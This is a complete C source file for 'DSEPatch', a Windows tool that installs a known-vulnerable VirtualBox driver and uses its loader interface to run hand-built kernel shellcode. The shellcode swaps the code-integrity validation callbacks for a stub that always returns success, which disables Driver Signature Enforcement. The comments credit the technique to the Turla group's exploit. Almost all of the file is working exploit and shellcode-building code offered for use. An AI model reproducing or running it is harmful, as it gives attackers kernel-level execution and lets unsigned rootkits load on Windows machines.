/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2019
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.05
*
*  DATE:        22 Jan 2019
*
*  Codename: Kawakaze
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "vboxdrv.h"

#pragma data_seg("shrd")
volatile LONG g_lApplicationInstances = 0;
#pragma data_seg()
#pragma comment(linker, "/Section:shrd,RWS")

HINSTANCE  g_hInstance;
RTL_OSVERSIONINFOW g_osv;

HANDLE	g_hVBox = INVALID_HANDLE_VALUE;
BOOL	g_VBoxInstalled = FALSE;

#define VBoxDrvSvc      TEXT("VBoxDrv")
#define supImageName    "kawakaze"
#define supImageHandle  0x1a000

#define NTOSKRNL_EXE    TEXT("ntoskrnl.exe")

#define T_PROGRAMTITLE  TEXT("DSEPatch v1.0.5 from 22 Jan 2019 ")
#define T_PROGRAMUNSUP	TEXT("[!] Unsupported WinNT version\r\n")
#define T_PROGRAMRUN    TEXT("[!] Another instance running, close it before\r\n")
#define T_PROGRAMINTRO  TEXT("(c) 2016 - 2019 DSEPatch Project\r\nSupported x64 OS : 7 and above\r\n")
#define T_VBOXDETECT	TEXT("[~] Detected VirtualBox software installation, driver backup will be done")

#define CiValidateImageHeader_7601          0
#define CiValidateImageData_7601            1

#define CiValidateImageHeader_9200_17763    4 //include skip first size element
#define CiValidateImageData_9200_17763      5 //include skip first size element


typedef PVOID(NTAPI *pfnExAllocatePool)(
    _In_ POOL_TYPE PoolType,
    _In_ SIZE_T NumberOfBytes);

typedef VOID(NTAPI *pfnExFreePool)(
    _In_ PVOID P);

typedef struct _PARAM_TABLE {
    BOOL Restore;
    ULONG_PTR CiValidateImageDataPtr;
    ULONG_PTR CiValidateImageHeaderPtr;
    pfnExAllocatePool ExAllocatePool;
    pfnExFreePool ExFreePool;
} PARAM_TABLE, *PPARAM_TABLE;

#ifdef _DEBUG
#define BOOTSTRAPCODE_SIZE 2048
#else
#define BOOTSTRAPCODE_SIZE 968
#endif

//sizeof = 1024 in Release
// WARNING: shellcode DOESN'T WORK in DEBUG
typedef struct _SHELLCODE {
    BYTE InitCode[16];
    BYTE PatchCode[BOOTSTRAPCODE_SIZE];
    PARAM_TABLE ParametersBlock;
} SHELLCODE, *PSHELLCODE;

SHELLCODE *g_ShellCode;

/*
* RunExploit
*
* Purpose:
*
* VirtualBox exploit used by WinNT/Turla.
* Slightly modified version from TDL 1.14
*
*/
void RunExploit(
    _In_ LPVOID Shellcode,
    _In_ ULONG CodeSize
)
{
    SUPCOOKIE       Cookie;
    SUPLDROPEN      OpenLdr;
    DWORD           bytesIO = 0;
    RTR0PTR         ImageBase = NULL;
    ULONG_PTR       paramOut;
    PSUPLDRLOAD     pLoadTask = NULL;
    SUPSETVMFORFAST vmFast;
    SUPLDRFREE      ldrFree;
    SIZE_T          memIO;
    WCHAR           text[256];

    if (g_hVBox == INVALID_HANDLE_VALUE)
        return;

    do {
        RtlSecureZeroMemory(&Cookie, sizeof(SUPCOOKIE));
        Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
        Cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
        Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
        Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        Cookie.Hdr.rc = 0;
        Cookie.u.In.u32ReqVersion = 0;
        Cookie.u.In.u32MinVersion = 0x00070002;
        RtlCopyMemory(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof(SUPCOOKIE_MAGIC));

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_COOKIE,
            &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
            SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(TEXT("[!] SUP_IOCTL_COOKIE call failed"), TRUE);
            break;
        }

        RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
        OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
        OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
        OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        OpenLdr.Hdr.rc = 0;
        OpenLdr.u.In.cbImage = CodeSize;
        RtlCopyMemory(OpenLdr.u.In.szName, supImageName, sizeof(supImageName));

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_OPEN, &OpenLdr,
            SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
            SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(TEXT("[!] SUP_IOCTL_LDR_OPEN call failed"), TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("[+] OpenLdr.u.Out.pvImageBase = 0x"));
            u64tohex((ULONG_PTR)OpenLdr.u.Out.pvImageBase, _strend(text));
            cuiPrintText(text, TRUE);
        }

        ImageBase = OpenLdr.u.Out.pvImageBase;

        memIO = PAGE_SIZE + CodeSize;
        NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&pLoadTask, 0, &memIO,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (pLoadTask == NULL)
            break;

        pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        pLoadTask->Hdr.cbIn =
            (ULONG_PTR)(&((PSUPLDRLOAD)0)->u.In.achImage) + CodeSize;
        pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
        pLoadTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
        pLoadTask->Hdr.rc = 0;
        pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
        pLoadTask->u.In.pvImageBase = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)supImageHandle;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = ImageBase;
        RtlCopyMemory(pLoadTask->u.In.achImage, Shellcode, CodeSize);
        pLoadTask->u.In.cbImage = CodeSize;

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_LOAD,
            pLoadTask, pLoadTask->Hdr.cbIn,
            pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(TEXT("[!] SUP_IOCTL_LDR_LOAD call failed"), TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("[+] SUP_IOCTL_LDR_LOAD, success\r\n\tShellcode mapped at 0x"));
            u64tohex((ULONG_PTR)ImageBase, _strend(text));
            _strcat(text, TEXT(", size = 0x"));
            ultohex(CodeSize, _strend(text));
            cuiPrintText(text, TRUE);
        }

        RtlSecureZeroMemory(&vmFast, sizeof(vmFast));
        vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        vmFast.Hdr.rc = 0;
        vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
        vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
        vmFast.u.In.pVMR0 = (LPVOID)supImageHandle;

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_SET_VM_FOR_FAST,
            &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,
            &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(TEXT("[!] SUP_IOCTL_SET_VM_FOR_FAST call failed"), TRUE);
            break;
        }
        else {
            cuiPrintText(TEXT("[+] SUP_IOCTL_SET_VM_FOR_FAST call complete"), TRUE);
        }

        cuiPrintText(TEXT("[+] SUP_IOCTL_FAST_DO_NOP"), TRUE);

        paramOut = 0;
        DeviceIoControl(g_hVBox, SUP_IOCTL_FAST_DO_NOP,
            NULL, 0,
            &paramOut, sizeof(paramOut), &bytesIO, NULL);

        cuiPrintText(TEXT("[+] SUP_IOCTL_LDR_FREE"), TRUE);

        RtlSecureZeroMemory(&ldrFree, sizeof(ldrFree));
        ldrFree.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        ldrFree.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        ldrFree.Hdr.cbIn = SUP_IOCTL_LDR_FREE_SIZE_IN;
        ldrFree.Hdr.cbOut = SUP_IOCTL_LDR_FREE_SIZE_OUT;
        ldrFree.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        ldrFree.Hdr.rc = 0;
        ldrFree.u.In.pvImageBase = ImageBase;

        DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_FREE,
            &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_IN,
            &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_OUT, &bytesIO, NULL);

    } while (FALSE);

    if (pLoadTask != NULL) {
        memIO = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&pLoadTask, &memIO, MEM_RELEASE);
    }

    if (g_hVBox != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hVBox);
        g_hVBox = INVALID_HANDLE_VALUE;
    }
}

/*
* StartVulnerableDriver
*
* Purpose:
*
* Load vulnerable virtualbox driver and return handle for it device.
*
*/
HANDLE StartVulnerableDriver(
    VOID
)
{
    BOOL        bCond = FALSE;
    PBYTE       DrvBuffer;
    ULONG       DataSize = 0, bytesIO;
    HANDLE      hDevice = INVALID_HANDLE_VALUE;
    WCHAR       szDriverFileName[MAX_PATH * 2];
    SC_HANDLE   schSCManager = NULL;
    LPWSTR      msg;

    DrvBuffer = VBoxDrv;
    DataSize = sizeof(VBoxDrv);

    do {

        RtlSecureZeroMemory(szDriverFileName, sizeof(szDriverFileName));
        if (!GetSystemDirectory(szDriverFileName, MAX_PATH)) {
            cuiPrintText(TEXT("[!] Error loading VirtualBox driver, GetSystemDirectory failed"), TRUE);
            break;
        }

        schSCManager = OpenSCManager(NULL,
            NULL,
            SC_MANAGER_ALL_ACCESS);

        if (schSCManager == NULL) {
            cuiPrintText(TEXT("[!] Error opening SCM database"), TRUE);
            break;
        }

        //
        // Lookup main vbox driver device,
        // if found then try to unload all possible vbox drivers,
        // where unload order is sensitive because some vbox drivers depends on each other.
        //
        if (supIsObjectExists(L"\\Device", L"VBoxDrv")) {
            cuiPrintText(TEXT("[~] Active VirtualBox found in system, attempt unload it"), TRUE);

            if (scmStopDriver(schSCManager, TEXT("VBoxNetAdp"))) {
                cuiPrintText(TEXT("[+] VBoxNetAdp driver unloaded"), TRUE);
            }
            if (scmStopDriver(schSCManager, TEXT("VBoxNetLwf"))) {
                cuiPrintText(TEXT("[+] VBoxNetLwf driver unloaded"), TRUE);
            }
            if (scmStopDriver(schSCManager, TEXT("VBoxUSBMon"))) {
                cuiPrintText(TEXT("[+] VBoxUSBMon driver unloaded"), TRUE);
            }
            Sleep(1000);
            if (scmStopDriver(schSCManager, TEXT("VBoxDrv"))) {
                cuiPrintText(TEXT("[+] VBoxDrv driver unloaded"), TRUE);
            }
        }

        //
        // If vbox installed backup it driver, do it before dropping our.
        //
        if (g_VBoxInstalled) {
            if (supBackupVBoxDrv(FALSE) == FALSE) {
                cuiPrintText(TEXT("[!] Error while doing VirtualBox driver backup"), TRUE);
                break;
            }
        }

        //
        // Drop our vboxdrv version.
        //
        _strcat(szDriverFileName, TEXT("\\drivers\\VBoxDrv.sys"));
        bytesIO = (ULONG)supWriteBufferToFile(
            szDriverFileName,
            DrvBuffer,
            (SIZE_T)DataSize);

        if (bytesIO != DataSize) {
            cuiPrintText(TEXT("[!] Error writing VirtualBox on disk"), TRUE);
            break;
        }

        //
        // If vbox not found in system install driver in scm.
        //
        if (g_VBoxInstalled == FALSE) {
            scmInstallDriver(schSCManager, VBoxDrvSvc, szDriverFileName);
        }

        //
        // Run driver.
        //
        if (scmStartDriver(schSCManager, VBoxDrvSvc) != FALSE) {

            if (scmOpenDevice(VBoxDrvSvc, &hDevice))
                msg = TEXT("[+] Vulnerable driver loaded and opened");
            else
                msg = TEXT("[!] Driver device open failure");

        }
        else {
            msg = TEXT("[!] Vulnerable driver load failure");
        }

        cuiPrintText(msg, TRUE);

    } while (bCond);

    //post cleanup
    if (schSCManager != NULL) {
        CloseServiceHandle(schSCManager);
    }
    return hDevice;
}

/*
* StopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver. If VirtualBox installed - restore original driver.
*
*/
void StopVulnerableDriver(
    VOID
)
{
    SC_HANDLE	       schSCManager;
    LPWSTR             msg;
    UNICODE_STRING     uStr;
    OBJECT_ATTRIBUTES  ObjectAttributes;

    cuiPrintText(TEXT("[+] Unloading vulnerable driver"), TRUE);

    if (g_hVBox != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hVBox);
        g_hVBox = INVALID_HANDLE_VALUE;
    }

    schSCManager = OpenSCManager(NULL,
        NULL,
        SC_MANAGER_ALL_ACCESS);

    if (schSCManager == NULL) {
        cuiPrintText(TEXT("[!] Cannot open database, unable unload driver"), TRUE);
        return;
    }

    //stop driver in any case
    if (scmStopDriver(schSCManager, VBoxDrvSvc))
        msg = TEXT("[+] Vulnerable driver successfully unloaded");
    else
        msg = TEXT("[!] Unexpected error while unloading driver");

    cuiPrintText(msg, TRUE);

    //if VBox not installed - remove from scm database and delete file
    if (g_VBoxInstalled == FALSE) {

        if (scmRemoveDriver(schSCManager, VBoxDrvSvc))
            msg = TEXT("[+] Driver entry removed from registry");
        else
            msg = TEXT("[!] Error removing driver entry from registry");

        cuiPrintText(msg, TRUE);

        uStr.Buffer = NULL;
        uStr.Length = 0;
        uStr.MaximumLength = 0;
        RtlInitUnicodeString(&uStr, L"\\??\\globalroot\\systemroot\\system32\\drivers\\VBoxDrv.sys");
        InitializeObjectAttributes(&ObjectAttributes, &uStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (NT_SUCCESS(NtDeleteFile(&ObjectAttributes)))
            msg = TEXT("[+] Driver file removed");
        else
            msg = TEXT("[!] Error removing driver file");

        cuiPrintText(msg, TRUE);

    }
    else {
        //VBox software present, restore original driver and exit
        if (supBackupVBoxDrv(TRUE))
            msg = TEXT("[+] Original driver restored");
        else
            msg = TEXT("[!] Unexpected error while restoring original driver");

        cuiPrintText(msg, TRUE);
    }
    CloseServiceHandle(schSCManager);
}

/*
* ExAllocatePoolTest
*
* Purpose:
*
* User mode test routine.
*
*/
PVOID NTAPI ExAllocatePoolTest(
    _In_ POOL_TYPE PoolType,
    _In_ SIZE_T NumberOfBytes)
{
    PVOID P;
    UNREFERENCED_PARAMETER(PoolType);

    P = VirtualAlloc(NULL, NumberOfBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (P) RtlSecureZeroMemory(P, NumberOfBytes);

    return P;
}


/*
* ExFreePoolTest
*
* Purpose:
*
* User mode test routine.
*
*/
VOID NTAPI ExFreePoolTest(
    _In_ PVOID P)
{
    VirtualFree(P, 0, MEM_RELEASE);
}

#include <intrin.h>

typedef struct _PATCH_CODE {
    UCHAR StubCode[4];
    ULONG BeginMarker;
    PVOID CiValidateImageDataOriginal;
    PVOID CiValidateImageHeaderOriginal;
    ULONG EndMarker;
    ULONG AlwaysZero;
} PATCH_CODE, *PPATCH_CODE;

#define CI_PATCH_MARKER_BEGIN   '_URG' //GRU_
#define CI_PATCH_MARKER_END     ' x0f' //f0x

/*
* PatchRoutine
*
* Purpose:
*
* ShellCode to be executed in kernel mode.
*
*/
NTSTATUS NTAPI PatchRoutine(
    _In_ PSHELLCODE ShellCode
)
{
    PATCH_CODE *CiPatchStub;

    if (ShellCode->ParametersBlock.Restore) {

        //
        // Restore mode.
        //
        CiPatchStub = *(PATCH_CODE**)ShellCode->ParametersBlock.CiValidateImageDataPtr;
        if ((CiPatchStub->BeginMarker == CI_PATCH_MARKER_BEGIN) && (CiPatchStub->EndMarker == CI_PATCH_MARKER_END)) {

            _InterlockedExchangePointer((PVOID*)ShellCode->ParametersBlock.CiValidateImageDataPtr,
                CiPatchStub->CiValidateImageDataOriginal);

            _InterlockedExchangePointer((PVOID*)ShellCode->ParametersBlock.CiValidateImageHeaderPtr,
                CiPatchStub->CiValidateImageHeaderOriginal);

            ShellCode->ParametersBlock.ExFreePool(CiPatchStub);
        }

    }
    else {
        //
        // Patch mode.
        //
        CiPatchStub = (PATCH_CODE*)ShellCode->ParametersBlock.ExAllocatePool(NonPagedPoolExecute, PAGE_SIZE);
        if (CiPatchStub) {

            //
            // xor eax, eax
            // retn
            // int 3
            //
            CiPatchStub->StubCode[0] = 0x33;
            CiPatchStub->StubCode[1] = 0xC0;
            CiPatchStub->StubCode[2] = 0xC3;
            CiPatchStub->StubCode[3] = 0xCC;
            CiPatchStub->BeginMarker = CI_PATCH_MARKER_BEGIN;
            CiPatchStub->EndMarker = CI_PATCH_MARKER_END;
            CiPatchStub->AlwaysZero = 0;

            CiPatchStub->CiValidateImageDataOriginal = _InterlockedExchangePointer((PVOID*)ShellCode->ParametersBlock.CiValidateImageDataPtr,
                (PVOID)CiPatchStub);

            CiPatchStub->CiValidateImageHeaderOriginal = _InterlockedExchangePointer((PVOID*)ShellCode->ParametersBlock.CiValidateImageHeaderPtr,
                (PVOID)CiPatchStub);

        }
    }
    return STATUS_SUCCESS; //end of proc marker
}

/*
* PatchCiCallbacks
*
* Purpose:
*
* Preload kernel, locate callbacks and patch them.
*
*/
UINT PatchCiCallbacks(
    _In_ BOOL bRestore
)
{
    UINT uResult = ERROR_NOT_CAPABLE;
    ULONG_PTR ConvertedFuncPtr = 0;

    DWORD SizeOfImage = 0;

    HMODULE hNtOs = NULL;

    ULONG_PTR CiCallbacks = 0;
    ULONG_PTR NtOsBase = 0;

    ULONG CiValidateImageHeaderIndex, CiValidateImageDataIndex;
    ULONG ProcedureSize;

    WCHAR szBuffer[MAX_PATH + 1];
    WCHAR szFullModuleName[MAX_PATH * 2];

    WCHAR *szErrorCiCallbacks;

    do {

        //
        // Get ntoskrnl loaded image base.
        //
        NtOsBase = supGetNtOsBase();
        if (NtOsBase) {
            _strcpy(szBuffer, TEXT("[+] Loaded ntoskrnl base = 0x"));
            u64tohex(NtOsBase, _strend(szBuffer));
            cuiPrintText(szBuffer, TRUE);
        }
        else {
            cuiPrintText(TEXT("[!] Cannot query ntoskrnl loaded base, abort"), TRUE);
            uResult = ERROR_MOD_NOT_FOUND;
            break;
        }

        //
        // Map ntoskrnl copy.
        //
        szFullModuleName[0] = 0;
        if (!GetSystemDirectory(szFullModuleName, MAX_PATH)) {
            uResult = ERROR_WRONG_TARGET_NAME;
            break;
        }
        _strcat(szFullModuleName, TEXT("\\"));
        _strcat(szFullModuleName, NTOSKRNL_EXE);

        hNtOs = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (hNtOs) {
            _strcpy(szBuffer, TEXT("[+] ntoskrnl.exe loaded for pattern search at 0x"));
            u64tohex((ULONG_PTR)hNtOs, _strend(szBuffer));
            cuiPrintText(szBuffer, TRUE);

            SizeOfImage = RtlImageNtHeader(hNtOs)->OptionalHeader.SizeOfImage;
            if (SizeOfImage == 0) {
                cuiPrintText(TEXT("[!] Invalid ntoskrnl SizeOfImage"), TRUE);
                uResult = ERROR_INVALID_DATA;
                break;
            }
            _strcpy(szBuffer, TEXT("[+] ntoskrnl SizeOfImage = 0x"));
            ultohex(SizeOfImage, _strend(szBuffer));
            cuiPrintText(szBuffer, TRUE);
        }
        else {
            cuiPrintText(TEXT("[!] Cannot load ntoskrnl.exe"), TRUE);
            uResult = ERROR_NOT_CAPABLE;
            break;
        }

        CiCallbacks = supFindCiCallbacks(g_osv.dwBuildNumber, SizeOfImage, NtOsBase, hNtOs);
        if (CiCallbacks == 0) {
            if (g_osv.dwBuildNumber < 9200) {
                szErrorCiCallbacks = TEXT("[!] Cannot find g_CiCallbacks");
            }
            else {
                szErrorCiCallbacks = TEXT("[!] Cannot find SeCiCallbacks");
            }
            cuiPrintText(szErrorCiCallbacks, TRUE);
            uResult = ERROR_NOT_CAPABLE;
            break;
        }
        else {
            _strcpy(szBuffer, TEXT("[+] CiCallbacks found at 0x"));
            u64tohex((ULONG_PTR)CiCallbacks, _strend(szBuffer));
            cuiPrintText(szBuffer, TRUE);
        }

        g_ShellCode = (SHELLCODE*)VirtualAlloc(NULL, sizeof(SHELLCODE),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);

        if (g_ShellCode == NULL) {
            uResult = ERROR_NOT_ENOUGH_MEMORY;
            break;
        }

        RtlSecureZeroMemory(g_ShellCode, sizeof(SHELLCODE));

        //
        // Build initial code part.
        //
        // 00 call +5
        // 05 pop rcx
        // 07 sub rcx, 5
        // 0B jmps 10 
        // 0D int 3
        // 0E int 3
        // 0F int 3
        // 10 code

        //int 3
        memset(g_ShellCode->InitCode, 0xCC, sizeof(g_ShellCode->InitCode));

        //call +5
        g_ShellCode->InitCode[0x0] = 0xE8;
        g_ShellCode->InitCode[0x1] = 0x00;
        g_ShellCode->InitCode[0x2] = 0x00;
        g_ShellCode->InitCode[0x3] = 0x00;
        g_ShellCode->InitCode[0x4] = 0x00;

        //pop rcx
        g_ShellCode->InitCode[0x5] = 0x59;

        //sub rcx, 5
        g_ShellCode->InitCode[0x6] = 0x48;
        g_ShellCode->InitCode[0x7] = 0x83;
        g_ShellCode->InitCode[0x8] = 0xE9;
        g_ShellCode->InitCode[0x9] = 0x05;

        // jmps
        g_ShellCode->InitCode[0xA] = 0xEB;
        g_ShellCode->InitCode[0xB] = 0x04;

        if (g_osv.dwBuildNumber <= 7601) {
            CiValidateImageHeaderIndex = CiValidateImageHeader_7601;
            CiValidateImageDataIndex = CiValidateImageData_7601;
        }
        else {
            CiValidateImageHeaderIndex = CiValidateImageHeader_9200_17763;
            CiValidateImageDataIndex = CiValidateImageData_9200_17763;
        }

        g_ShellCode->ParametersBlock.CiValidateImageHeaderPtr = CiCallbacks + (sizeof(ULONG_PTR) * CiValidateImageHeaderIndex);
        g_ShellCode->ParametersBlock.CiValidateImageDataPtr = CiCallbacks + (sizeof(ULONG_PTR) * CiValidateImageDataIndex);

        //
        // Locate ExAllocatePool address
        // 
        ConvertedFuncPtr = supGetProcAddress(NtOsBase, (ULONG_PTR)hNtOs, "ExAllocatePool");
        if (ConvertedFuncPtr == 0) {
            cuiPrintText(TEXT("[!] Error, ExAllocatePool address not found"), TRUE);
            uResult = ERROR_PROC_NOT_FOUND;
            break;
        }
        else {
            _strcpy(szBuffer, TEXT("[+] ExAllocatePool 0x"));
            u64tohex(ConvertedFuncPtr, _strend(szBuffer));
            cuiPrintText(szBuffer, TRUE);
        }

#ifdef _DEBUG
        g_ShellCode->ParametersBlock.ExAllocatePool = (pfnExAllocatePool)ExAllocatePoolTest;
#else
        g_ShellCode->ParametersBlock.ExAllocatePool = (pfnExAllocatePool)ConvertedFuncPtr;
#endif

        if (bRestore) {
            cuiPrintText(TEXT("[+] Attempt to restore DSE state"), TRUE);
            ConvertedFuncPtr = supGetProcAddress(NtOsBase, (ULONG_PTR)hNtOs, "ExFreePool");
            if (ConvertedFuncPtr == 0) {
                cuiPrintText(TEXT("[!] Error, ExFreePool address not found"), TRUE);
                uResult = ERROR_PROC_NOT_FOUND;
                break;
            }
            else {
                _strcpy(szBuffer, TEXT("[+] ExFreePool 0x"));
                u64tohex(ConvertedFuncPtr, _strend(szBuffer));
                cuiPrintText(szBuffer, TRUE);
            }

#ifdef _DEBUG
            g_ShellCode->ParametersBlock.ExFreePool = (pfnExFreePool)ExFreePoolTest;
#else
            g_ShellCode->ParametersBlock.ExFreePool = (pfnExFreePool)ConvertedFuncPtr;
#endif
        }
        else {
            cuiPrintText(TEXT("[+] Attempt to patch DSE"), TRUE);
        }

        g_ShellCode->ParametersBlock.Restore = bRestore;

        //
        // Copy patch routine.
        //
        ProcedureSize = supSizeOfProc((PBYTE)PatchRoutine);
        if (ProcedureSize != 0) {

            _strcpy(szBuffer, TEXT("[+] PatchCode code size = 0x"));
            ultohex(ProcedureSize, _strend(szBuffer));
            cuiPrintText(szBuffer, TRUE);

            if (ProcedureSize > sizeof(g_ShellCode->PatchCode)) {
                _strcpy(szBuffer, TEXT("[!] PatchCode code size exceeds limit, abort"));
                cuiPrintText(szBuffer, TRUE);
                uResult = ERROR_INTERNAL_ERROR;
                break;
            }
            memcpy(g_ShellCode->PatchCode, PatchRoutine, ProcedureSize);
            //supWriteBufferToFile(L"out.bin", PatchRoutine, ProcedureSize);
        }
        else {
            cuiPrintText(TEXT("[!] Patch procedure size is 0 - unexpected, abort"), TRUE);
            uResult = ERROR_INTERNAL_ERROR;
            break;
        }

#ifdef _DEBUG
        //PatchRoutine(g_ShellCode);
        //((void(*)())g_ShellCode->InitCode)();
#endif

#ifndef _DEBUG
        g_hVBox = StartVulnerableDriver();
        if (g_hVBox != INVALID_HANDLE_VALUE) {
#endif
            RunExploit(g_ShellCode, sizeof(SHELLCODE));

#ifndef _DEBUG
            StopVulnerableDriver();
        }
#endif

        uResult = ERROR_SUCCESS;

    } while (FALSE);

    if (hNtOs) FreeLibrary(hNtOs);
    if (g_ShellCode) VirtualFree(g_ShellCode, 0, MEM_RELEASE);

    return uResult;
}

/*
* ProcessCommandLine
*
* Purpose:
*
* Check command line, run patch/restore.
*
*/
UINT ProcessCommandLine(
    _In_ LPWSTR lpCommandLine
)
{
    BOOL bRestore = FALSE;

    UINT uResult = ERROR_NOT_CAPABLE;

    ULONG c;

    WCHAR szBuffer[MAX_PATH + 1];

    //
    // Command line options.
    //
    c = 0;
    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
    GetCommandLineParam(lpCommandLine, 1, (LPWSTR)&szBuffer, MAX_PATH, &c);

    //
    // Check "restore" command.
    //
    if (c > 0) {
        if (_strcmpi(szBuffer, TEXT("-r")) == 0) {
            bRestore = TRUE;
        }
    }

    PatchCiCallbacks(bRestore);

    return uResult;
}

/*
* main
*
* Purpose:
*
* Program main.
*
*/
void main()
{
    LONG x;
    UINT uResult = 0;

    ULONG bytesIO;

    NTSTATUS Status;

    SYSTEM_CODEINTEGRITY_INFORMATION state;

    WCHAR szOut[200];

    do {

        cuiInitialize(FALSE, NULL);

        cuiClrScr();

        SetConsoleTitle(T_PROGRAMTITLE);
        cuiPrintText(T_PROGRAMTITLE, FALSE);
        cuiPrintText(T_PROGRAMINTRO, TRUE);

        x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
        if (x > 1) {
            cuiPrintText(T_PROGRAMRUN, TRUE);
            uResult = ERROR_ALREADY_EXISTS;
            break;
        }

        RtlSecureZeroMemory(&g_osv, sizeof(g_osv));
        g_osv.dwOSVersionInfoSize = sizeof(g_osv);
        RtlGetVersion((PRTL_OSVERSIONINFOW)&g_osv);
        if (g_osv.dwMajorVersion < 6) {
            cuiPrintText(T_PROGRAMUNSUP, TRUE);
            uResult = ERROR_UNSUPPORTED_TYPE;
            break;
        }

        _strcpy(szOut, TEXT("[+] Windows v"));
        ultostr(g_osv.dwMajorVersion, _strend(szOut));
        _strcat(szOut, TEXT("."));
        ultostr(g_osv.dwMinorVersion, _strend(szOut));
        _strcat(szOut, TEXT(" build "));
        ultostr(g_osv.dwBuildNumber, _strend(szOut));
        cuiPrintText(szOut, TRUE);

        //
        // Show Code Integrity Information.
        //
        state.CodeIntegrityOptions = 0;
        state.Length = sizeof(state);

        Status = NtQuerySystemInformation(SystemCodeIntegrityInformation,
            (PVOID)&state, sizeof(SYSTEM_CODEINTEGRITY_INFORMATION),
            &bytesIO);

        if (NT_SUCCESS(Status)) {
            if (state.CodeIntegrityOptions & CODEINTEGRITY_OPTION_ENABLED) {
                cuiPrintText(TEXT("[+] System reports CodeIntegrityOption as Enabled"), TRUE);
            }
        }

        g_VBoxInstalled = supIsVBoxInstalled();
        if (g_VBoxInstalled) {
            cuiPrintText(T_VBOXDETECT, TRUE);
        }

        __try {
            uResult = ProcessCommandLine(GetCommandLine());
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            cuiPrintText(TEXT("[=] Unrecoverable exception"), TRUE);
        }

        cuiPrintText(TEXT("[+] Exit"), TRUE);

    } while (FALSE);

    InterlockedDecrement((PLONG)&g_lApplicationInstances);
    ExitProcess(uResult);
}
